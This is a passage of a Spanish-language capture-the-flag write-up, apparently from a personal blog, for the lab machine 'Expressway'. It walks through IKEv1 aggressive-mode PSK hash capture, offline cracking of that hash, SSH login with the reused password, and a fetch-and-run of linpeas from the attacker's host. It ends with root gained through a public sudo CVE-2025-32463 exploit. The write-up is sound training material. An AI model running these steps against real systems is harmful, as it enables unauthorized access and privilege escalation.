+<li>Uso del <strong>HMAC-SHA1</strong> para integridad (<code>Hash=SHA1</code>).</li>
+<li>EL uso de <strong>DH group 2: 1024-bit MODP</strong> (<code>Group=2:modp1024</code>)</li>
+<li>El método de autenticación es <strong>Pre-Shared Key</strong> (<code>Auth=PSK</code>).</li>
+<li>La duración de la SA en segundos (<code>LifeDuration=28800</code>, 8 horas).</li>
+</ul>
+</li>
+<li>El servidor devolvió su <strong>material DH (KE)</strong> y un <strong>nonce</strong>; esos valores, combinados con el <strong>PSK</strong> y otros datos, sirven para calcular claves y hashes durante la autenticación.</li>
+<li>El servidor incluye una identidad de tipo <strong>ID_USER_FQDN</strong> con el valor <code>ike@expressway.htb</code>. Esto puede indicar la identidad que el servidor espera o la identidad que el cliente debe usar.</li>
+<li>En el Vendor ID; el servidor anuncia las capacidades:
+<ul>
+<li>Uso de <strong>XAUTH</strong>. Si el servidor requiere <strong>XAUTH</strong>, el <strong>PSK</strong> solo no permite completar la conexión; necesitas <strong>credenciales XAUTH</strong>.</li>
+<li><strong>Dead Peer Detection (DPD)</strong> → soporta DPD para detectar peers caídos. No es explotable por sí mismo, pero es fingerprinting útil.</li>
+</ul>
+</li>
+<li>El <strong>Hash(20 bytes)</strong> indica un <strong>hash SHA1 (20 bytes)</strong>, que es el <strong>hash/HMAC</strong> derivado del <strong>PSK</strong> y otros valores del intercambio.</li>
+</ul>
+<p>Lo importante aquí:</p>
+<ul>
+<li>Se pudo identificar el <strong>Aggressive Mode (IKEv1)</strong>, que nos puede permitir obtener el <strong>PSK</strong>.</li>
+<li>La autenticación <strong>Auth=PSK</strong> más la presencia de <strong>Hash(20 bytes)</strong>, nos indica que es posible crackear de forma offline si es que podemos obtener el <strong>PSK</strong></li>
+<li>El uso del <strong>XAUTH</strong>, que nos indica el posible uso obligatorio de credenciales extras para la autenticación.</li>
+<li>Y tenemos una identidad de tipo <strong>ID_USER_FQDN</strong> con el valor <code>ike@expressway.htb</code>.</li>
+</ul>
+<p>Tratemos de obtener el <strong>PSK</strong>.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="PSK">Obtención y Crackeo de PSK y Ganando Acceso a la Máquina Víctima Vía SSH</h3>
+<p>Podemos aplicar 2 formas para intentar obtener el <strong>PSK</strong> con la herramienta <strong>ike-scan</strong>.</p>
+<p>La primera sería usando la flag <code>--pskcrack</code> para obtener el <strong>PSK</strong> de forma directa:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike-scan -A --pskcrack 10.10.11.87
+</span></span><span style="display:flex;"><span>Starting ike-scan 1.9.6 with <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.10.11.87	Aggressive Mode Handshake returned HDR<span style="color:#f92672">=(</span>CKY-R<span style="color:#f92672">=</span>c1936d1c28da6029<span style="color:#f92672">)</span> SA<span style="color:#f92672">=(</span>Enc<span style="color:#f92672">=</span>3DES Hash<span style="color:#f92672">=</span>SHA1 Group<span style="color:#f92672">=</span>2:modp1024 Auth<span style="color:#f92672">=</span>PSK LifeType<span style="color:#f92672">=</span>Seconds LifeDuration<span style="color:#f92672">=</span>28800<span style="color:#f92672">)</span> KeyExchange<span style="color:#f92672">(</span><span style="color:#ae81ff">128</span> bytes<span style="color:#f92672">)</span> Nonce<span style="color:#f92672">(</span><span style="color:#ae81ff">32</span> bytes<span style="color:#f92672">)</span> ID<span style="color:#f92672">(</span>Type<span style="color:#f92672">=</span>ID_USER_FQDN, Value<span style="color:#f92672">=</span>ike@expressway.htb<span style="color:#f92672">)</span> VID<span style="color:#f92672">=</span>09002689dfd6b712 <span style="color:#f92672">(</span>XAUTH<span style="color:#f92672">)</span> VID<span style="color:#f92672">=</span>afcad71368a1f1c96b8696fc77570100 <span style="color:#f92672">(</span>Dead Peer Detection v1.0<span style="color:#f92672">)</span> Hash<span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>IKE PSK parameters <span style="color:#f92672">(</span>g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>0b3aca1bac7c6632ac1dbbcb8a7959aee25c0a8c7b89d0e4246ef3e21e760eb9f02661ca3efaad08065b7adf7c98ac18a4829a98abdf761e1e120edbd8cc2d19214ce587d33498c1d61ddea55b429caeeaacff4d8f4d7c489e691a6c44826250e95e1cd2feafdb1ee72f0349cfae552751ea5357d8aa6bc9ec30fe645bde514e:f49d76eb68034f139359cfafff7b8f5dcde6fcf053b5637e2269bbe88a833acbb8c51e48fd9da13e45423662a78750861424acc4b570414f7171cb6365db8283a86fd1237b4de5b0ae4b16771d9eb1ffd010b640deda506e0f3c913ecb50da732a0e8326f5f97a16dead2474d1771af49262908ec2046242f0697da7d5680e93:c1936d1c28da6029:eea09bda60a0ba69:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:292f43f49fa8997a3ce63c41fb3631d2fe4938e9:0730335c68c68630e479ec8e87302446d2f9dd691428a03b974932e5f887fcce:f760963359540ef23665a1fd726ab99fa423e232
+</span></span><span style="display:flex;"><span>Ending ike-scan 1.9.6: <span style="color:#ae81ff">1</span> hosts scanned in 0.082 seconds <span style="color:#f92672">(</span>12.20 hosts/sec<span style="color:#f92672">)</span>.  <span style="color:#ae81ff">1</span> returned handshake; <span style="color:#ae81ff">0</span> returned notify
+</span></span></code></pre></div><p>Ahí lo tenemos, es todo ese hash debajo del <strong>IKE PSK parameters</strong>.</p>
+<p>La segunda sería usando la flag <code>-P</code> (que es lo mismo que la flag <code>--pskcrack</code>), pero si le agregamos enseguida un nombre, se generará un archivo con el nombre que diste y contendrá la <strong>PSK</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike-scan -M -A -Pike_psk.params 10.10.11.87
+</span></span><span style="display:flex;"><span>Starting ike-scan 1.9.6 with <span style="color:#ae81ff">1</span> hosts <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>10.10.11.87     Aggressive Mode Handshake returned
+</span></span><span style="display:flex;"><span>        HDR<span style="color:#f92672">=(</span>CKY-R<span style="color:#f92672">=</span>061b5594bfb4535f<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        SA<span style="color:#f92672">=(</span>Enc<span style="color:#f92672">=</span>3DES Hash<span style="color:#f92672">=</span>SHA1 Group<span style="color:#f92672">=</span>2:modp1024 Auth<span style="color:#f92672">=</span>PSK LifeType<span style="color:#f92672">=</span>Seconds LifeDuration<span style="color:#f92672">=</span>28800<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        KeyExchange<span style="color:#f92672">(</span><span style="color:#ae81ff">128</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        Nonce<span style="color:#f92672">(</span><span style="color:#ae81ff">32</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        ID<span style="color:#f92672">(</span>Type<span style="color:#f92672">=</span>ID_USER_FQDN, Value<span style="color:#f92672">=</span>ike@expressway.htb<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VID<span style="color:#f92672">=</span>09002689dfd6b712 <span style="color:#f92672">(</span>XAUTH<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        VID<span style="color:#f92672">=</span>afcad71368a1f1c96b8696fc77570100 <span style="color:#f92672">(</span>Dead Peer Detection v1.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        Hash<span style="color:#f92672">(</span><span style="color:#ae81ff">20</span> bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Ending ike-scan 1.9.6: <span style="color:#ae81ff">1</span> hosts scanned in 0.085 seconds <span style="color:#f92672">(</span>11.77 hosts/sec<span style="color:#f92672">)</span>.  <span style="color:#ae81ff">1</span> returned handshake; <span style="color:#ae81ff">0</span> returned notify
+</span></span></code></pre></div><p>El nombre que use es <strong>ike_psk.params</strong> y se generó correctamente.</p>
+<p>Ahora, para crackear ese hash, podemos utilizar la herramienta <strong>psk-crack</strong>, utilizando el modo diccionario para asignarle un wordlist que nos sirva para crackear la <strong>PSK</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.params
+</span></span><span style="display:flex;"><span>Starting psk-crack <span style="color:#f92672">[</span>ike-scan 1.9.6<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>http://www.nta-monitor.com/tools/ike-scan/<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Running in dictionary cracking mode
+</span></span><span style="display:flex;"><span>key <span style="color:#e6db74">&#34;********************&#34;</span> matches SHA1 hash 0d141798ba758678596b6878f140d42fdb51dd20
+</span></span><span style="display:flex;"><span>Ending psk-crack: <span style="color:#ae81ff">8045040</span> iterations in 12.824 seconds <span style="color:#f92672">(</span>627361.61 iterations/sec<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Tenemos la contraseña.</p>
+<p>Podríamos intentar configurar un <strong>cliente IPsec</strong> como <strong>StrongSwan</strong> para establecer la <strong>VPN/SA</strong> y ver si podemos obtener acceso a la red interna.</p>
+<p>Para ello tendríamos que crear/modificar 2 archivos llamados <strong>ipsec.conf</strong> e <strong>ipsec.secret</strong>, con datos del <strong>protocolo IKE</strong>.</p>
+<p>El problema es que necesitaremos credenciales de <strong>XAUTH</strong> que no tenemos.</p>
+<p>Algo que si tenemos, es un usuario llamado <strong>ike</strong>, por lo que quizá este usuario exista en la máquina víctima. Además, podemos probar la contraseña del <strong>PKS</strong> por si este usuario la utiliza:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh ike@10.10.11.87
+</span></span><span style="display:flex;"><span>ike@10.10.11.87<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux expressway.htb 6.16.7+deb14-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Fri Sep <span style="color:#ae81ff">26</span> 20:44:17 <span style="color:#ae81ff">2025</span>
+</span></span><span style="display:flex;"><span>ike@expressway:~$ whoami
+</span></span><span style="display:flex;"><span>ike
+</span></span></code></pre></div><p>Excelente, estamos dentro.</p>
+<p>Aquí podemos encontrar la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>ike@expressway:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="sudo">Explotando Vulnerabilidad de la Versión 1.9.17 de Sudo para Escalar Privilegios</h3>
+<p>Veamos qué privilegios tiene nuestro usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ sudo -l
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>Sorry, user ike may not run sudo on expressway.
+</span></span></code></pre></div><p>No tenemos privilegios.</p>
+<p>Veamos a qué grupos pertenecemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ike<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ike<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>ike<span style="color:#f92672">)</span>,13<span style="color:#f92672">(</span>proxy<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>No veo una forma de abusar del <strong>grupo Proxy</strong>.</p>
+<p>Podemos utilizar la herramienta <strong>linpeas.sh</strong> para tratar de identificar una vulnerabilidad.</p>
+<p>Puedes descargarlo aquí:</p>
+<ul>
+<li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a></li>
+</ul>
+<p>Levanta un servidor con <strong>Python3</strong> en donde tengas el <strong>linpeas.sh</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http://0.0.0.0:80/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Y vamos a ejecutarlo de forma remota desde la máquina víctima con <strong>wget</strong> y <strong>bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ wget -qO- http://&lt;Tu_IP&gt;/linpeas.sh | bash
+</span></span></code></pre></div><p>Analizando el resultado, no encontraremos algo como tal que nos ayude, más que la llave privada <strong>id_rsa</strong> del <strong>usuario ike</strong>.</p>
+<p>Pero algo que sí podemos ver, es la versión del comando <strong>sudo</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>╔══════════╣ Sudo version
+</span></span><span style="display:flex;"><span>╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
+</span></span><span style="display:flex;"><span>Sudo version 1.9.17
+</span></span></code></pre></div><p>Resulta que esta versión desactualizada es vulnerable, lo que nos puede permitir escalar privilegios para convertirnos en <strong>Root</strong>.</p>
+<p>Podemos comprobar la versión de <strong>sudo</strong> de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ sudo -V
+</span></span><span style="display:flex;"><span>Sudo version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">50</span>
+</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.9.17
+</span></span><span style="display:flex;"><span>Sudoers audit plugin version 1.9.17
+</span></span></code></pre></div><p>Buscando en internet, encontraremos varios Exploits para esta versión de <strong>sudo</strong>, siendo la que yo ocuparé la siguiente:</p>
+<ul>
+<li><a href="https://github.com/KaiHT-Ladiant/CVE-2025-32463" target="_blank">Repositorio de KaiHT-Ladiant: CVE-2025-32463</a></li>
+</ul>
+<p>El repositorio nos indica que si cumplimos los siguientes requisitos, el Exploit funcionará:</p>
+<ul>
+<li>El sistema corre la versión de <strong>sudo 1.9.14 a 1.9.17</strong>, que ya comprobamos que usa la <strong>versión 1.9.17</strong></li>
+<li>El usuario actual tiene privilegios de <strong>sudo</strong>, que ya comprobamos que nuestro usuario no tiene alguno.</li>
+<li>La configuración de <strong>sudoers</strong> permite operaciones <strong>chroot</strong>. No hay una forma como tal para comprobarlo, pero puedes ejecutar el siguiente comando: <code>sudo -l 2&gt;/dev/null | grep -i chroot || true</code>.</li>
+<li>El compilador <strong>gcc</strong> está disponible en el sistema actual. Podemos identificar si existe el comando <strong>gcc</strong> con el comando <strong>which</strong>: <code>which gcc</code>.</li>
+<li>Acceso de escritura a directorios temporales (por ejemplo, <code>/tmp</code>). Esto lo podemos hacer con el comando <code>ls -ld /tmp</code> y viendo qué permisos tiene el directorio <code>/tmp</code>.</li>
+</ul>
+<p>Como tal, tenemos todo menos los privilegios de <strong>sudo</strong>, pero aun así, vamos a probar si funciona el Exploit.</p>
+<p>Descárgalo clonando el repositorio o solamente copiando el script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget https://raw.githubusercontent.com/KaiHT-Ladiant/CVE-2025-32463/refs/heads/main/cve-2025-32463.sh
+</span></span></code></pre></div><p>Copia el Exploit en la máquina víctima usando un servidor de <strong>Python3</strong> y el comando <strong>wget</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ wget http://&lt;Tu_IP&gt;/cve-2025-32463.sh
+</span></span><span style="display:flex;"><span>ike@expressway:~$ ls
+</span></span><span style="display:flex;"><span>cve-2025-32463.sh  linpeas_fat.sh  pspy64  user.txt
+</span></span></code></pre></div><p>Démosle permisos de ejecución y ejecutemos el Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ike@expressway:~$ chmod +x cve-2025-32463.sh 
+</span></span><span style="display:flex;"><span>ike@expressway:~$ ./cve-2025-32463.sh 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploiting CVE-2025-32463...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting privilege escalation...
+</span></span><span style="display:flex;"><span>root@expressway:/# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Listo, somos <strong>Root</strong>.</p>
+<p>Obtengamos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@expressway:/# cd /root
+</span></span><span style="display:flex;"><span>root@expressway:/root# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@expressway:/root# cat root.txt
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting" target="_blank" rel="noopener noreferrer">https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting</a></li><li><a href="https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp" target="_blank" rel="noopener noreferrer">https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp</a></li><li><a href="https://libreswan.org/man/ipsec.conf.5.html" target="_blank" rel="noopener noreferrer">https://libreswan.org/man/ipsec.conf.5.html</a></li><li><a href="https://wiki.strongswan.org/projects/strongswan/wiki/connsection" target="_blank" rel="noopener noreferrer">https://wiki.strongswan.org/projects/strongswan/wiki/connsection</a></li><li><a href="https://github.com/peass-ng/PEASS-ng" target="_blank" rel="noopener noreferrer">https://github.com/peass-ng/PEASS-ng</a></li><li><a href="https://github.com/KaiHT-Ladiant/CVE-2025-32463" target="_blank" rel="noopener noreferrer">https://github.com/KaiHT-Ladiant/CVE-2025-32463</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-dragon/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Dragon - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-elCandidato/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">El Candidato - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
